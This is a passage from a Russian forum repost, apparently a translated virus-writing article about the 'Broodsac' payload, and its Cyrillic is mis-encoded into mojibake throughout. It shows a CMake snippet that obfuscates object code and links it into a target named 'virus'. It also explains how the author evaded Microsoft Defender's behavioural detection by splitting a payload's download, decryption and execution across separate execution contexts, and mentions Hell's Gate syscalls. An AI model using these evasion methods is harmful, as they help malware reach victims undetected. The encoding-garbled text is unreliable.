—Ç–∞–∫:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>add_library(obfuscateme STATIC obfu.c)
add_custom_command(TARGET obfuscateme
PRE_LINK COMMAND obfuscate ARGS
&quot;${CMAKE_CURRENT_BINARY_DIR}/obfuscateme.dir/$&lt;CONFIG&gt;/obfu.obj&quot;)
add_executable(virus main.c)
target_link_libraries(virus obfuscateme)</code></pre>
	</div>
</div><br />
–≠—Ç–∏ –ø—Ä–æ—Å—Ç—ã–µ —á–µ—Ç—ã—Ä–µ —Å—Ç—Ä–æ–∫–∏ –∫–æ–º–ø–∏–ª–∏—Ä—É—é—Ç –Ω–∞–±–æ—Ä —Ñ—É–Ω–∫—Ü–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –Ω—É–∂–Ω–æ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞—Ç—å, –≤—ã–∑—ã–≤–∞—é—Ç –æ–±—Ñ—É—Å–∫–∞—Ç–æ—Ä –¥–ª—è –Ω–∞—à–µ–≥–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –æ–±—ä–µ–∫—Ç–Ω–æ–≥–æ —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä—ã–π –∑–∞—Ç–µ–º —Å–Ω–æ–≤–∞ –≤–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –ø—Ä–æ—Ü–µ—Å—Å —Å–±–æ—Ä–∫–∏ –Ω–∞ —ç—Ç–∞–ø–µ –ª–∏–Ω–∫–æ–≤–∫–∏, –∞ –∑–∞—Ç–µ–º –¥–æ–±–∞–≤–ª—è—é—Ç –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –≤–∏—Ä—É—Å–∞. –ö–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ —Ü–µ–ª—å –≤–∏—Ä—É—Å–∞ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –¥–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏, —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –±—É–¥–µ—Ç –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–∞ –∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤–∫–ª—é—á–µ–Ω–∞ –≤ –Ω–∞—à –∫–æ–¥. –ü–æ —Å—É—Ç–∏, –µ—Å–ª–∏ –≤—ã –º–æ–∂–µ—Ç–µ –≤—ã–∑–≤–∞—Ç—å –≤–Ω–µ—à–Ω—é—é –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —á–µ–≥–æ-–ª–∏–±–æ –∫–∞–∫ —á–∞—Å—Ç—å –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å–±–æ—Ä–∫–∏, –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ –≤ –≤–∞—à—É –ø—Ä–æ–≥—Ä–∞–º–º—É –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω—ã.<br />
<br />
–ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —Ç–æ, —á—Ç–æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ —ç—Ç–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π –∫–∞–∂—É—Ç—Å—è –≤–µ—Å—å–º–∞ –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–º–∏, –Ω–∞—à–∞ –ø–æ–ø—ã—Ç–∫–∞ —Å–∫—Ä—ã—Ç—å —Å–∏–≥–Ω–∞—Ç—É—Ä—ã, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–µ, –∫–∞–∫ –º—ã –¥—É–º–∞–ª–∏, –º—ã –ø–æ–ø–∞–¥–∞–ª–∏, –æ–∫–∞–∑–∞–ª–∞—Å—å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ–π. –í–∏–¥–∏—Ç–µ –ª–∏, –∫–∞–∫ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ —Å–∏–≥–Ω–∞—Ç—É—Ä Defender[5], —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ç–∏–ø–æ–≤ —Å–∏–≥–Ω–∞—Ç—É—Ä, —Å –∫–æ—Ç–æ—Ä—ã–º–∏ –ø—Ä–∏—Ö–æ–¥–∏—Ç—Å—è –∏–º–µ—Ç—å –¥–µ–ª–æ, –∏, —Å–æ–≥–ª–∞—Å–Ω–æ DefenderCheck[6] –∏ —á—É—Ç—å –±–æ–ª–µ–µ –ø—Ä–æ–¥–≤–∏–Ω—É—Ç–æ–º—É ThreatCheck[7], —è –Ω–µ –Ω–∞—Ç–∞–ª–∫–∏–≤–∞–ª—Å—è –Ω–∞ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–µ —Å–∏–≥–Ω–∞—Ç—É—Ä—ã. –î–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ, –∫–æ–ø–∞–Ω–∏–µ –≤ –Ω–µ–¥—Ä–∞—Ö –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö —Å–∏–≥–Ω–∞—Ç—É—Ä –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω—ã—Ö —É–≥—Ä–æ–∑ –æ–∫–∞–∑–∞–ª–æ—Å—å –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –±–µ—Å–ø–ª–æ–¥–Ω—ã–º –≤ –ø–æ–∏—Å–∫–∞—Ö –ø–æ–¥—Å–∫–∞–∑–æ–∫ –æ —Ç–æ–º, –∫–∞–∫ –∏—Ö –æ–±–æ–π—Ç–∏ ‚Äî —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–ª –∞–ª–≥–æ—Ä–∏—Ç–º —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–π —Å–∏–≥–Ω–∞—Ç—É—Ä—ã, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª –Ω–µ —Å–æ–≤—Å–µ–º —è—Å–µ–Ω –ø–æ –ø–æ–≤–æ–¥—É —Ç–æ–≥–æ, –∫–∞–∫ –æ–Ω —Å–∫–∞–Ω–∏—Ä—É–µ—Ç—Å—è, –∏, —á—Ç–æ –±–æ–ª–µ–µ –≤–∞–∂–Ω–æ, –Ω–µ—á—Ç–æ –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º &quot;NID.&quot;<br />
<br />
NID –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ, –ø–æ-–≤–∏–¥–∏–º–æ–º—É, –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä—É–µ—Ç —á—Ç–æ-—Ç–æ –≤–Ω—É—Ç—Ä–∏ Network Realtime Inspection Service.[8] –í–µ—Ä–æ—è—Ç–Ω–æ, —ç—Ç–æ –∫–∞–∫–∞—è-—Ç–æ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ –æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º –ø–æ–≤–µ–¥–µ–Ω–∏–∏. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –Ω–∞—à–∏ —Å–∏–≥–Ω–∞—Ç—É—Ä—ã, –≤–µ—Ä–æ—è—Ç–Ω–æ, —Å—Ä–∞–±–∞—Ç—ã–≤–∞–ª–∏ –Ω–∞ –ø–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫—É—é —Å–∏–≥–Ω–∞—Ç—É—Ä—É! –ö–∞–∫ –º—ã –º–æ–≥–ª–∏ –±—ã —ç—Ç–æ –æ–±–æ–π—Ç–∏?<br />
<br />
–ù–∞–∏–≤–Ω–æ, –Ω–µ —Å—Ç–∞–ª–∫–∏–≤–∞—è—Å—å —Å —ç—Ç–∏–º —Ä–∞–Ω–µ–µ, –º—ã –±—Ä–æ—Å–∏–ª–∏ –Ω–∞ —Å—Ç–µ–Ω—É –∫—É—á—É —Å–ª—É—á–∞–π–Ω—ã—Ö —Ä–µ—à–µ–Ω–∏–π, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å, —á—Ç–æ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç. Hell&#039;s Gate? –°–µ—Ä–≤–∏—Å Network Realtime Inspection –Ω–µ –±—ã–ª EDR, —Ç–∞–∫ —á—Ç–æ, –µ—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω–æ, —ç—Ç–æ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–æ. –ù–µ –≥–æ–≤–æ—Ä—è —É–∂–µ –æ —Ç–æ–º, —á—Ç–æ —Å —É–Ω–∏–∫–∞–ª—å–Ω–æ–π –ø–æ–∑–∏—Ü–∏–µ–π Microsoft –Ω–∞ –ª–∞–Ω–¥—à–∞—Ñ—Ç–µ Windows (–æ–Ω–∏ —è–≤–ª—è—é—Ç—Å—è —Ö–æ–∑—è–µ–≤–∞–º–∏ –ø–æ–¥–∑–µ–º–µ–ª—å—è), –ø–æ–ø—ã—Ç–∫–∏ –æ–±–æ–π—Ç–∏ EDR –ø—Ä–æ—Å—Ç–æ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã. –ù–æ —Ä–∞–¥–∏ –ø–æ–ª–Ω–æ—Ç—ã –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —É–∫–ª–æ–Ω–µ–Ω–∏–π —ç—Ç–æ –±—ã–ª–æ –æ—Å—Ç–∞–≤–ª–µ–Ω–æ –≤ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–µ Broodsac. (–†–µ–∞–ª–∏–∑–∞—Ü–∏—è Hell&#039;s Gate —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –∞ –Ω–µ –∫–æ—Å–≤–µ–Ω–Ω—ã—Ö, —Ç–∞–∫ —á—Ç–æ –Ω–∞–¥ —ç—Ç–∏–º –µ—â—ë –ø—Ä–µ–¥—Å—Ç–æ–∏—Ç –ø–æ—Ä–∞–±–æ—Ç–∞—Ç—å.)<br />
<br />
–ü–æ —Å—É—Ç–∏, –ø–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫–∞—è —Å–∏–≥–Ω–∞—Ç—É—Ä–∞ –ø–æ–ª–∞–≥–∞–µ—Ç—Å—è –Ω–∞ —Ü–µ–ø–æ—á–∫—É –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π, —á—Ç–æ–±—ã –æ–±—ä—è–≤–∏—Ç—å —á—Ç–æ-—Ç–æ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º. –î–∞–≤–∞–π—Ç–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ, –ø–æ —Å—É—Ç–∏, –¥–µ–ª–∞–µ—Ç –Ω–∞—à–∞ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, —á—Ç–æ –º–æ–≥–ª–æ –±—ã –±—ã—Ç—å –æ—Ç–º–µ—á–µ–Ω–æ –∫–∞–∫ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ:<br />
<br />
<ul>
<li data-xf-list-type="ul">–∑–∞–≥—Ä—É–∑–∫–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞</li>
<li data-xf-list-type="ul">–≤–æ–∑–º–æ–∂–Ω–æ, –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞</li>
<li data-xf-list-type="ul">–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞</li>
</ul><br />
–ß–µ—Å—Ç–Ω–æ –≥–æ–≤–æ—Ä—è, —è –Ω–µ –≤–∏–∂—É –≤ —ç—Ç–æ–º –Ω–∏—á–µ–≥–æ –ø–ª–æ—Ö–æ–≥–æ, –Ω–æ, –≤–∏–¥–∏–º–æ, Microsoft –Ω–µ —Å–æ–≥–ª–∞—Å–µ–Ω!<br />
<br />
–ó–∞–±–∞–≤–Ω–∞—è –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç—å –ø–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –æ–Ω –ø–æ–ª–∞–≥–∞–µ—Ç—Å—è –Ω–∞ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –ø–æ–≤–µ–¥–µ–Ω–∏—è –≤ –¥–∞–Ω–Ω–æ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –∞ –Ω–µ –Ω–∞ —Å—É–º–º—É –µ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–π. –ß—Ç–æ–±—ã –ø–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ –±—ã–ª —É—Å–ø–µ—à–Ω—ã–º, –Ω–µ–≥–∞—Ç–∏–≤–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è, –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–æ–∏—Å—Ö–æ–¥—è—Ç –≤ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏, –¥–æ–ª–∂–Ω—ã –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç—å –≤ –æ–¥–Ω–æ–º –∏ —Ç–æ–º –∂–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
<b><u>–ï—Å–ª–∏ –º—ã —Ä–∞–∑–¥–µ–ª–∏–º —Ç—Ä–∏ –≤—ã—à–µ—É–ø–æ–º—è–Ω—É—Ç—ã–µ –∑–∞–¥–∞—á–∏ –Ω–∞ —Ç—Ä–∏ –æ—Ç–¥–µ–ª—å–Ω—ã—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è ‚Äî –∑–∞–≥—Ä—É–∑–∫–∞, –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∞ –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ ‚Äî –±—É–¥–µ—Ç –ª–∏ —ç—Ç–æ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ, —á—Ç–æ–±—ã –æ–±–æ–π—Ç–∏ –ø–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫–æ–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ?</u></b><br />
<br />
–î–∞! –•–æ—Ç—è —è –Ω–µ –ø—Ä–æ–≤–æ–¥–∏–ª –æ–±—Ä–∞—Ç–Ω—É—é —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É NisSrv.exe, —á—Ç–æ–±—ã –ø–æ–Ω—è—Ç—å, –ø–æ—á–µ–º—É –º–Ω–µ —É–¥–∞–ª–æ—Å—å –æ–±–æ–π—Ç–∏ –∑–∞—â–∏—Ç—É, —Ç–µ–æ—Ä–∏—è –æ —Ä–∞–∑–¥–µ–ª–µ–Ω–∏–∏ –∑–∞–¥–∞—á –º–µ–∂–¥—É –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞–º–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ–∫–∞–∑–∞–ª–∞—Å—å —É—Å–ø–µ—à–Ω–æ–π –≤ –æ–±—Ö–æ–¥–µ Defender.<br />
<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —ç–≤–æ–ª—é—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–ª–∞ –≤ –∏–Ω—Ç–µ—Ä–µ—Å–Ω—É—é –º–Ω–æ–≥–æ—ç—Ç–∞–ø–Ω—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –ø—Ä–∏–¥–µ—Ç—Å—è –∑–∞–ø—É—Å–∫–∞—Ç—å –∑–∞—Ä–∞–∂–µ–Ω–Ω—ã–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑, –ø—Ä–µ–∂–¥–µ —á–µ–º –ø–æ—è–≤–∏—Ç—Å—è –æ–≤–µ—á–∫–∞. –≠—Ç–æ —Ç–∞–∫–∂–µ –ø—Ä–∏–Ω–µ—Å–ª–æ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–µ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–æ –≤ –ø–ª–∞–Ω–µ —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏. –û—Ç–∫—É–¥–∞ –±–µ—Ä—ë—Ç—Å—è –æ–≤–µ—á–∫–∞? –ü–æ—á–µ–º—É —ç—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ —è –∑–∞–ø—É—Å–∫–∞—é —ç—Ç—É –ø—Ä–æ–≥—Ä–∞–º–º—É? –ó–∞–≥–∞–¥–∫–∞! –ù–æ –º–∏–ª–æ. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, Broodsac –æ–ø—Ä–∞–≤–¥—ã–≤–∞–µ—Ç —Å–≤–æ—ë –Ω–∞–∑–≤–∞–Ω–∏–µ –º–Ω–æ–≥–æ—Å–ª–æ–π–Ω–æ–≥–æ —á–µ—Ä–≤—è, –≤ —á–µ—Å—Ç—å –∫–æ—Ç–æ—Ä–æ–≥–æ –æ–Ω –±—ã–ª –Ω–∞–∑–≤–∞–Ω, –∑–µ–ª—ë–Ω–æ-–ø–æ–ª–æ—Å–∞—Ç–æ–≥–æ –±—Ä–æ–¥—Å–∞–∫–∞.[9]<br />
<br />
–ù–∞—à –¥–∑–µ–Ω-—Å–∞–¥ —É—Ö–æ–∂–µ–Ω –∏ –≥–æ—Ç–æ–≤ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –∏–º –ø–æ–¥–µ–ª–∏–ª–∏—Å—å, —á—Ç–æ–±—ã –¥—Ä—É–≥–∏–µ –º–æ–≥–ª–∏ –º–µ–¥–∏—Ç–∏—Ä–æ–≤–∞—Ç—å –∏ —Ä–∞–∑–º—ã—à–ª—è—Ç—å –æ —Å–≤–æ–∏—Ö —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã—Ö —Å–∞–¥–∞—Ö. –î–ª—è —ç—Ç–æ–π –º–µ–¥–∏—Ç–∞—Ü–∏–∏ —Ä–∞–∑–ª–∏—á–Ω—ã–µ –∫–æ–¥–æ–≤—ã–µ –æ–±—ä–µ–∫—Ç—ã, —Å–æ–¥–µ—Ä–∂–∞—â–∏–µ—Å—è –≤ –∞—Ä—Ö–∏–≤–µ, –ø—Ä–∏–ª–∞–≥–∞–µ–º–æ–º –∫ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ, –±—ã–ª–∏ –∞–Ω–Ω–æ—Ç–∏—Ä–æ–≤–∞–Ω—ã –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è–º–∏, –æ–±—ä—è—Å–Ω—è—é—â–∏–º–∏ –æ—Ç–¥–µ–ª—å–Ω—ã–µ –æ–±–ª–∞—Å—Ç–∏ –∫–æ–¥–∞ –∏ –∏—Ö –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ. –ï—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω–æ, —Å–ª–æ–∂–Ω–æ—Å—Ç—å –¥–∏–Ω–æ–∑–∞–≤—Ä–∞, –∫–æ—Ç–æ—Ä—ã–º —è–≤–ª—è–µ—Ç—Å—è —Ñ–æ—Ä–º–∞—Ç PE, —Å–æ–ø—Ä–æ–≤–æ–∂–¥–∞–µ—Ç—Å—è —Ä–∞–∑–¥—Ä–∞–∂–∞—é—â–∏–º–∏, –æ—Ç–≤—Ä–∞—Ç–∏—Ç–µ–ª—å–Ω—ã–º–∏ —Ç—Ä—é–∫–∞–º–∏ –∏ –ø—Ä–∏–≤—ã—á–∫–∞–º–∏, –∏–∑-–∑–∞ –∫–æ—Ç–æ—Ä—ã—Ö –≤ –ø–µ—Ä–≤—É—é –æ—á–µ—Ä–µ–¥—å —Å—Ç—ã–¥–Ω–æ –∑–∞ —Å–≤–æ–π –∫–æ–¥. –ü—Ä–æ—à—É –ø—Ä–æ—â–µ–Ω–∏—è –æ—Ç –∏–º–µ–Ω–∏ –ú–∞—Ä–∫–∞ –ó–±–∏–∫–æ–≤—Å–∫–∏.<br />
<br />
<b>--[ 6. –ó–∞–∫–ª—é—á–µ–Ω–∏–µ</b><br />
<br />
–ù–µ—Ç –Ω–∏–∫–∞–∫–∏—Ö —Å–æ–º–Ω–µ–Ω–∏–π –≤ —Ç–æ–º, —á—Ç–æ —Å—Ç—Ä–∞–Ω–Ω—ã–µ –∞–Ω–æ–º–∞–ª–∏–∏ –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã –≤–∏–¥–∏—Ç–µ –≤ –¥–∏–∫–∏—Ö –æ–±—Ä–∞–∑—Ü–∞—Ö –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û, —è–≤–ª—è—é—Ç—Å—è –ø–æ–±–æ—á–Ω—ã–º –ø—Ä–æ–¥—É–∫—Ç–æ–º –∫–∞–∫–æ–π-—Ç–æ —Å–∏—Å—Ç–µ–º—ã —Å–±–æ—Ä–∫–∏. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ SmokeLoader –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π, –±–µ–∑—É—Å–ª–æ–≤–Ω–æ, –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–µ–π –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ MSVC[10]. –ù–æ –¥–∞–∂–µ –≥—Ä—É–±–∞—è –∏ –±—ã—Å—Ç—Ä–∞—è –ø–µ—Ä–µ—Ä–∞–±–æ—Ç–∫–∞ C-—Ñ–∞–π–ª–∞, —Å–±—Ä–æ—à–µ–Ω–Ω–æ–≥–æ –≤ –∫–∞—Ç–∞–ª–æ–≥ –¥–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –≤ IDE, —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏ –±—É–¥–µ—Ç —Å—á–∏—Ç–∞—Ç—å—Å—è —Å–∏—Å—Ç–µ–º–æ–π —Å–±–æ—Ä–∫–∏. –í –∫–æ–Ω—Ü–µ –∫–æ–Ω—Ü–æ–≤, Visual Studio IDE ‚Äî —ç—Ç–æ –≤—Å–µ–≥–æ –ª–∏—à—å –æ–±–æ–ª–æ—á–∫–∞ –¥–ª—è —Å–∏—Å—Ç–µ–º—ã —Å–±–æ—Ä–∫–∏ MSVC. –ù–æ –∫–∞–∫ –≤–∏—Ä—É—Å–æ–ø–∏—Å–∞—Ç–µ–ª–∏, –º—ã, –≤ –∫–æ–Ω–µ—á–Ω–æ–º —Å—á–µ—Ç–µ, –≤—Å—ë –µ—â—ë –∏–Ω–∂–µ–Ω–µ—Ä—ã. –ú—ã —Å—Ç—Ä–µ–º–∏–º—Å—è –∫ –∫—Ä–∞—Å–∏–≤–æ–º—É —Ä–µ—à–µ–Ω–∏—é –ø—Ä–æ–±–ª–µ–º—ã. –ú—ã –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ —Ö–æ—Ç–∏–º —Å–æ–∑–¥–∞—Ç—å —Å–≤–æ–π —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –º–∞–ª–µ–Ω—å–∫–∏–π –¥–∑–µ–Ω-—Å–∞–¥, –∑–∞ –∫–æ—Ç–æ—Ä—ã–º –º–æ–∂–Ω–æ —É—Ö–∞–∂–∏–≤–∞—Ç—å.<br />
<br />
–ü—Ä–µ–ª–µ—Å—Ç—å CMake, –≤ —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –æ–Ω –∫—Ä–æ—Å—Å–ø–ª–∞—Ç—Ñ–æ—Ä–º–µ–Ω–Ω—ã–π. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –µ—Å–ª–∏ —É –≤–∞—Å –µ—Å—Ç—å –∫–æ–¥ ‚Äî –Ω–∞–ø—Ä–∏–º–µ—Ä, –¥–≤–∏–∂–æ–∫ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, ‚Äî –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –Ω–∞ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞—Ö, CMake –º–æ–∂–µ—Ç —Å–¥–µ–ª–∞—Ç—å —Å–±–æ—Ä–∫—É –ø—Ä–æ–µ–∫—Ç–∞ –Ω–∞ –∫–∞–∂–¥–æ–π –ø–ª–∞—Ç—Ñ–æ—Ä–º–µ –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –±–µ–∑–±–æ–ª–µ–∑–Ω–µ–Ω–Ω–æ–π. –¢–æ—á–Ω–æ —Ç–∞–∫ –∂–µ, –∫–∞–∫ CMake —É–ø—Ä–∞–≤–ª—è–µ—Ç MSVC, –æ–Ω –º–æ–∂–µ—Ç —É–ø—Ä–∞–≤–ª—è—Ç—å –∏ —Å–ª–æ–∂–Ω–æ–π —Å—Ä–µ–¥–æ–π —Å–±–æ—Ä–∫–∏, —Ç–∞–∫–æ–π –∫–∞–∫ GNU Make. –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è –∏ –º–Ω–æ–≥–∏–µ –¥—Ä—É–≥–∏–µ —Ü–µ–ª–∏ —Å–±–æ—Ä–∫–∏, –Ω–æ –Ω–µ –≤—Å–µ —Ç–∞–∫ –∂–µ –ø–æ–ª–Ω–æ, –∫–∞–∫ MSVC –∏ GNU. –≠–∫–∑–æ—Ç–∏—á–µ—Å–∫–∏–µ —Ü–µ–ª–∏ –º–æ–≥—É—Ç –≤—ã–∑–≤–∞—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ç—Ä—É–¥–Ω–æ—Å—Ç–∏.<br />
<br />
